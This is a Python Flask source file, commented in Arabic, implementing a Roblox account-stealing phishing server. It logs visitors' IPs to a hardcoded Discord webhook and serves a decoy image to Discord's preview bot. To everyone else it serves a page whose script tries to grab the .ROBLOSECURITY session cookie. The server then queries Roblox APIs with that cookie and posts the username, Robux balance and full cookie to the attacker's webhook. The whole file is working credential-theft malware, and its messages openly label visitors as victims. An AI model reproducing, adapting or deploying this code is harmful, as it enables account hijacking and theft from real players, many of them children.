from flask import Flask, request
import requests, base64, re, json

app = Flask(__name__)

# غيّر الويب هوك بتاعك
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

def extract_roblox_info(cookie):
    if not cookie or len(cookie) < 50:
        return
    try:
        # جيب authenticated user
        auth_resp = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={'.ROBLOSECURITY': cookie}, timeout=5)
        if auth_resp.status_code != 200:
            return
        auth_data = auth_resp.json()
        user_id = auth_data.get("id")
        username = auth_data.get("name")

        # جيب user details
        user_resp = requests.get(f"https://users.roblox.com/v1/users/{user_id}", cookies={'.ROBLOSECURITY': cookie}, timeout=5)
        user_data = user_resp.json() if user_resp.status_code == 200 else {}

        # جيب Robux
        economy_resp = requests.get("https://economy.roblox.com/v1/user/currency", cookies={'.ROBLOSECURITY': cookie}, timeout=5)
        robux = economy_resp.json().get("robux", 0) if economy_resp.status_code == 200 else 0

        # جيب premium status
        premium_resp = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", cookies={'.ROBLOSECURITY': cookie}, timeout=5)
        premium = premium_resp.json().get("isPremium", False) if premium_resp.status_code == 200 else False

        embed = {
            "title": "تم سرقة حساب Roblox كامل 2025",
            "color": 0x00ff00,
            "description": f"**Username:** {username}\n**User ID:** {user_id}\n**Robux Balance:** {robux}\n**Premium:** {'نعم' if premium else 'لا'}\n**Display Name:** {user_data.get('displayName', 'غير معروف')}\n**Created Date:** {user_data.get('created', 'غير معروف')}\n**Cookie Snippet:** ||{cookie[:50]}...||\n**Full Cookie:** ||{cookie}||",
            "thumbnail": {"url": f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=150&height=150&format=png"}
        }
        requests.post(WEBHOOK, json={"content": "@everyone", "embeds": [embed]})
    except:
        pass

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def roblox_cookie_grabber(path):
    ip = request.headers.get('X-Forwarded-For', 'Unknown').split(',')[0]
    ua = request.headers.get('User-Agent', '')

    if 'Discordbot' in ua:
        fake = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
        return fake, 200, {'Content-Type': 'image/png'}

    # إشعار أولي مع IP
    requests.post(WEBHOOK, json={"content": f"@everyone ضحية Roblox Logger\nIP: {ip}\nUA: {ua[:100]}"})

    # لو في كوكي في الـ query → استخرج التفاصيل
    cookie = request.args.get('cookie')
    if cookie:
        extract_roblox_info(cookie)
        return "تم السرقة ✓", 200

    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://i.imgur.com/Kp5jF8H.jpeg" style="width:100%;height:100vh;object-fit:contain">

<script>
// أحدث ثغرة Roblox Cookie 2025 - Simple + Fallback localStorage (بناءً على NEOSTEALER repos)
setTimeout(() => {{
  // جرب document.cookie أولاً
  let cookies = document.cookie;
  let robloMatch = cookies.match(/\\.ROBLOSECURITY=([^;]+)/);
  if (robloMatch) {{
    fetch("{request.url_root.rstrip('/')}/?cookie=" + encodeURIComponent(robloMatch[1]));
    return;
  }}

  // Fallback: localStorage (شغال على Roblox WebView shared مع Discord)
  let localRoblo = localStorage.getItem('.ROBLOSECURITY') || sessionStorage.getItem('.ROBLOSECURITY');
  if (localRoblo) {{
    fetch("{request.url_root.rstrip('/')}/?cookie=" + encodeURIComponent(localRoblo));
    return;
  }}

  // Proxy fetch لـ Roblox API عشان يجبر الكوكي
  fetch('https://www.roblox.com/my/account', {{credentials: 'include'}})
  .then(r => r.headers.get('set-cookie'))
  .then(setCookies => {{
    let match = setCookies ? setCookies.match(/\\.ROBLOSECURITY=([^;]+)/) : null;
    if (match) {{
      fetch("{request.url_root.rstrip('/')}/?cookie=" + encodeURIComponent(match[1]));
    }}
  }}).catch(() => {{}});

  // إشعار لو فشل
  fetch("{WEBHOOK}?content=@everyone فشل في جلب Roblox Cookie - IP: {ip}");
}}, 500);

</script>
</body></html>"""

    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}

if __name__ == "__main__":
    app.run()
